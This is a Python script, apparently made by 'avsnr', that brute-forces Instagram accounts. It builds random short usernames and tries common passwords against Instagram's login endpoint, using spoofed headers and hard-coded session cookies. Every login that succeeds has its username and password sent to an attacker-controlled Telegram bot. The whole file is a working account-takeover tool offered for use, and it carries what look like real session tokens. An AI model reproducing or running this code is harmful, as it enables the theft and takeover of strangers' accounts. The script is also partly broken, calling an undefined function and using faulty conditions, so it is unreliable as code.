import threading
import requests
import random
import os
import time
#avsnr
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
B = '\033[1;36m'
Y = '\033[1;34m' 
W = '\033[0m' 
P = '\u001b[35m'
G = '\033[1;32m'
R = '\033[1;31m'
pri=(f'''
{R}
{R}             the wrong account insta avsnr

{B}
{W}
               ___  _____   ________  
              / _ \/ __/ | / /  _/ /  
             / // / _/ | |/ // // /__ 
            /____/___/ |___/___/____/ 
  

          Made By : avsnr 
          Telegram : avsnr
          Instagram : avsnrr

\n\n

{Z1}                  py : avsnr
''')
print(pri)
ID = input(Z1+' INTER ID : '+Z)
print('')
token = input(Z1+' INTER TOKEN : '+Z)
print('')

print(f'{B}             ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ‌ ')
#avsnr
def json(ks,te1):
        user = ks
        pasw = te1
        url = 'https://www.instagram.com/accounts/login/ajax/'
        
        headers = {


'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
'content-length': '313',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'mid=Ypaq3AAEAAEIg549huD6OhdbB3BL; ig_did=5B9391EE-6FDB-4A05-851C-C678AAEBDA6C; ig_nrcb=1; datr=XOGYYoO6snvNKmgxjZ0ArAMI; shbid="19978\0548278760154\0541687278510:01f7c2c38af4e7852287222b524492109193a93f9e53244c70a699a7f417f967f95027da"; shbts="1655742510\0548278760154\0541687278510:01f7ec01be5f95a1fb00a2f07526638beb1b518a14f588ee9dfc7981cbcf82c2b191d9f6"; rur="CLN\0548278760154\0541687278566:01f77aa90c33ddf4a4294e8524285eff9eec99a976f09cdd7af33e906348094a9f1cf801"; csrftoken=Zj3ynb6WTBG2etZOvWCYCyIb75PLCJoP',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
'viewport-width': '837',
'x-asbd-id': '198387',
'x-csrftoken': 'Zj3ynb6WTBG2etZOvWCYCyIb75PLCJoP',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR3lfXF5tXWdNAAFmcV69o_BjHLlkLqbg4fYL_JLjTD2tEyh',
'x-instagram-ajax': '1f6bafe7323a',
'x-requested-with': 'XMLHttpRequest',

}

        tim = str(time.time()).split('.')[1]
        
        date = {
'username': user,
'enc_password':
f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pasw}',
}

        req = requests.post(url, headers=headers , data=date).text
        if '" on the login screen and follow the instructions to access your account.",' in req:
         print(f' {W}Good account » {user} : {pasw} ')
         tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= wrong account avsnr 💀👾 \nUseename : {user}\nPassowrd : {pasw}\n')
         ru= requests.post(tlg)              		  
                  
        elif ('"user":false,') and ('"authenticated":false') in req:
         print(f'{Z1} Bad account » {user} : {pasw} ')   
         #avsnr
        elif ('"user":true,') and ('"authenticated":true') in req:
         print(f' {W}Good account2 » {user} : {pasw} ')    
         tlg =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= wrong account avsnr 💀👾 )•\nUseename : {user}\nPassowrd : {pasw}\n')
         ru= requests.post(tlg)              		
        else:
        	print(f' {B}Error User » {user}')	
#avsnrr		
def check(ks):
        user = ks
        pasw = 'zxcvbm'
        url = 'https://www.instagram.com/accounts/login/ajax/'
        
        headers = {


'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
'content-length': '313',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'mid=Ypaq3AAEAAEIg549huD6OhdbB3BL; ig_did=5B9391EE-6FDB-4A05-851C-C678AAEBDA6C; ig_nrcb=1; datr=XOGYYoO6snvNKmgxjZ0ArAMI; shbid="19978\0548278760154\0541687278510:01f7c2c38af4e7852287222b524492109193a93f9e53244c70a699a7f417f967f95027da"; shbts="1655742510\0548278760154\0541687278510:01f7ec01be5f95a1fb00a2f07526638beb1b518a14f588ee9dfc7981cbcf82c2b191d9f6"; rur="CLN\0548278760154\0541687278566:01f77aa90c33ddf4a4294e8524285eff9eec99a976f09cdd7af33e906348094a9f1cf801"; csrftoken=Zj3ynb6WTBG2etZOvWCYCyIb75PLCJoP',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
'viewport-width': '837',
'x-asbd-id': '198387',
'x-csrftoken': 'Zj3ynb6WTBG2etZOvWCYCyIb75PLCJoP',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR3lfXF5tXWdNAAFmcV69o_BjHLlkLqbg4fYL_JLjTD2tEyh',
'x-instagram-ajax': '1f6bafe7323a',
'x-requested-with': 'XMLHttpRequest',

}

        tim = str(time.time()).split('.')[1]
        
        date = {
'username': user,
'enc_password':
f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pasw}',
}

        req = requests.post(url, headers=headers , data=date).text
        if ('"user":false,') in req:
        	print(f' {Y}Bad User » {user}')
        elif ('"user":true,') in req:
        	check2(user)
        else:
        	print(f' {B}Error User » {user}')

        	        	
def users():
  uus = 'qwert_yuiop.12345a_sdfghjkl_67890.zxcvb_nm'
  while True:
  	ZX = '34'
  	tO = int(random.choice(ZX))
  	ks = str(''.join(random.choice(uus) for i in range(tO)))
  	zaido = ('1122334455', 'Aa123123', 'Aa123456', '12341234', 'qwer1234', '1234qwer','xsbdhdhehr','12345678','abcdefgh','amir9808','avsnravsnr','instagram.com','98080208','aAbBcCdD','a1b2c3d4','12345678910','112288','22333445','987654321','133498765','49279616853','@#$$@#$@','13791379','201020112012','xbdgsyd','t.me/avsnr','amiramir','doyouloveme?','1qazxcvbnm','2wsdfghjkl','3ertyuiop','4rtyuiop','4567890','01234567','09876543')
  	te1 = random.choice(zaido)
  	json(ks,te1)

t1=threading.Thread(target=users,args=())
t1.start()
    
